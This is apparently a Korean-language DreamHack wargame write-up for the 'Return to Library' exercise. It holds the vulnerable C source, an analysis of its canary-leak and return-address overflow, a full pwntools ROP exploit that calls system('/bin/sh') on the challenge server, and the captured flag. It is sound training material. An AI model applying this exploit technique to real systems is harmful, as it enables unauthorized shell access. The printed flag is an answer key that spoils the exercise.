# [DreamHack] Return to Library

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Return to Library에서 실습하는 문제입니다.
>
> Release: [Return to Library.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8532842/Return.to.Library.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159805827-1db6187b-ecf9-456f-a0f1-0a9ea9d2102c.png)

## Analysis

```c
const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

`read(0, buf, 0x100)`로 두 차례 BOF가 발생한다. 첫 번째 BOF를 이용하여 canary를 leak할 수 있고, 그것을 이용하여 두 번째 BOF에서 `main()`의 `return address`를 덮을 수 있다. 바이너리에 `system()` 함수와 `"/bin/sh"` 문자열이 포함되어 있으므로, `pop rdi` 가젯을 찾아 `system("/bin/sh")`을 호출하도록 하면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rtl')
else:
    r = remote('host1.dreamhack.games', 13755)

sa = r.sendafter

binsh = 0x400874  # "/bin/sh"
system_plt = 0x4005d0  # PLT of system()
pop_rdi = 0x400853  # pop rdi; ret
ret = 0x400285  # ret gadget

# leak canary
sa('Buf: ', 'a' * 0x39)
r.recvuntil('Buf: ' + 'a' * 0x39)
canary = u64(r.recvn(7).rjust(8, b'\x00'))

# overwrite return address of main()
# call system("/bin/sh")
payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 8  # sfp
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
sa('Buf: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 13755: Done
[*] Switching to interactive mode
$ cat flag
DH{13e0d0ddf0c71c0ac4410687c11e6b00}
```
